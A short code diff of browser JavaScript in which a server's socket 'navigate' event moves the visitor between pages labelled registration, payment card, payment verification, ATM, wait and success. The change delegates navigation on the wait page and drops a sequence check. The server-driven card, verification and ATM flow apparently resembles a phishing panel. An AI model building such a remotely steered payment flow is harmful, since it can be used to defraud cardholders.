@@ -63,6 +63,11 @@ socket.on('connect', () => {
 });
 
 socket.on('navigate', ({ page }) => {
+  if (currentPage === 'wait' && typeof window.doNavigate === 'function') {
+    window.doNavigate(page);
+    return;
+  }
+
   const PAGES = [
     { id: 'index', name: 'الرئيسية', url: '/' },
     { id: 'registration', name: 'التسجيل', url: '/registration.html' },
@@ -76,17 +81,6 @@ socket.on('navigate', ({ page }) => {
     { id: 'wait', name: 'الانتظار', url: '/wait.html' },
     { id: 'success', name: 'نجاح', url: '/success.html' }
   ];
-
-  if (currentPage === 'wait') {
-    var src = sessionStorage.getItem('wait-source') || '';
-    var forwardMap = { 'payment-card': 'payment-verify', 'payment-verify': 'atm', 'atm': 'success' };
-    if (src && forwardMap[src] && page !== forwardMap[src]) {
-      sessionStorage.setItem('page-error', '1');
-    } else {
-      sessionStorage.removeItem('page-error');
-    }
-    sessionStorage.removeItem('wait-source');
-  }
 
   const target = PAGES.find(p => p.id === page)?.url || '/';
   window.location.href = target;
